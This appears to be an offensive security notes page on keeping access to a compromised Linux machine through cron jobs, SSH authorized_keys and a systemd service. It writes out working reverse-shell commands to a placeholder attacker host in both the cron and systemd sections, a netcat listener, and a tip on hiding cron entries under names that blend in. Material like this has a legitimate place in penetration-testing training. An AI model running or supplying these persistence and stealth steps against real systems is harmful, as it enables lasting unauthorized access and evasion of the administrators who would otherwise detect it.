### References

---

!!! tip "Stealthy vs quick"
    Cron (`* * * * * /tmp/.x`) is quick but obvious in `crontab -l`. For stealth, add to `/etc/cron.d/` with a blending name (`logrotate-extra`). SSH `authorized_keys` is most reliable — survives reboots and doesn't show in process listings.

## Persistence via Cron Jobs

Cron jobs execute scheduled commands at specified intervals. If a writable cron job is running as `root`, it can be modified to maintain persistence.

### Identifying Writable Cron Jobs

```bash
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
```

Check `/var/log/syslog` for cron job execution:

```bash
grep "CRON" /var/log/syslog
```

If a writable script is executed as `root`, modify it to maintain access.

### Injecting a Reverse Shell into a Cron Job

If a cron job is running an editable script:

```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /home/user/backup.sh
```

Then start a Netcat listener:

```bash
nc -lvnp 4444
```

When the cron job executes, it provides a reverse shell.

---

## Persistence via SSH Keys

Adding an SSH key to the `authorized_keys` file allows persistent access to the system.

### Creating an SSH Key

```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistent_key
```

Copy the public key to the target:

```bash
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
```

Now, access the system using:

```bash
ssh -i persistent_key user@target
```

This allows persistent access even if passwords change.

---

## Persistence via Systemd Service

Systemd allows persistent execution of malicious payloads by creating a service.

### Creating a Systemd Service

1. Create a service file:
    
    ```bash
    nano /etc/systemd/system/persistence.service
    ```
    
2. Add the following:
    
    ```
    [Unit]
    Description=Persistence Service
    After=multi-user.target
    
    [Service]
    Type=simple
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
    
    [Install]
    WantedBy=multi-user.target
    ```
    
3. Enable and start the service:
    
    ```bash
    systemctl enable persistence.service
    systemctl start persistence.service
    ```
    

This ensures the payload runs on every system reboot.